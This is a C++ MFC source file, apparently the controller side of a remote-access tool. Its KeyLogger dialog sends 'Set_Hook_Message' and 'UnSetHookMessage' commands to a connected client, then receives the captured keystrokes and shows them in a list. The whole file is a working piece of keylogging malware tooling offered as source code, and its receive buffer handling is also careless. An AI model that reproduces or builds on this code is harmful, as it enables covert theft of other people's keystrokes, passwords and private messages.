// KeyLogger.cpp : implementation file
//

#include "stdafx.h"
#include "Server.h"
#include "KeyLogger.h"
#include "afxdialogex.h"
#include "ServerDlg.h"


// KeyLogger dialog

IMPLEMENT_DYNAMIC(KeyLogger, CDialogEx)

KeyLogger::KeyLogger(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_KeyLogger, pParent)
{

}

KeyLogger::~KeyLogger()
{
}

void KeyLogger::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_HOOK, ListKeyLogger);
}


BEGIN_MESSAGE_MAP(KeyLogger, CDialogEx)
	ON_BN_CLICKED(IDC_HOOK, &KeyLogger::OnBnClickedHook)
END_MESSAGE_MAP()


// KeyLogger message handlers


void KeyLogger::OnBnClickedHook()
{
	CString cstr;
	char *ok = new char[10];
	GetDlgItem(IDC_HOOK)->GetWindowText(cstr);
	if (cstr == "Set Hook")
	{
		GetDlgItem(IDC_HOOK)->SetWindowText(L"Unset Hook");
		CServerDlg::_client.Send("Set_Hook_Message", 16, 0);
		ListKeyLogger.ResetContent();
	}
	else
	{
		GetDlgItem(IDC_HOOK)->SetWindowText(L"Set Hook");
		CServerDlg::_client.Send("UnSetHookMessage", 16, 0);
		char *keys = new char[1000];
		int len = CServerDlg::_client.Receive(keys, 1000, 0);
		keys[len] = '\0';
		char *p;
		CString s;
		p = strtok(keys, "\n");
		while (p != NULL)
		{
			s.Format(_T("%S"), p);
			ListKeyLogger.AddString(s.operator LPCWSTR());
			p = strtok(NULL, "\n");
		}
		delete[]keys;
	}
	delete[] ok;
}
